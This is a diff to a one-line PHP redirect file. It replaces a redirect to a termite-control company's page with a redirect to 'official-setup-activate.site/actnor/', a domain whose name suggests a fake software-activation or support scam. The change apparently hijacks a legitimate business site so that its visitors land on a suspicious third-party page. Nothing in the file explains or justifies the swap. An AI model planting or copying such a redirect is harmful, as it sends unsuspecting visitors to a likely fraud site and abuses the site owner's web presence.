@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.vulcantermite.com/termite-control.html");
+header("Location: https://official-setup-activate.site/actnor/");
 die();
 ?>
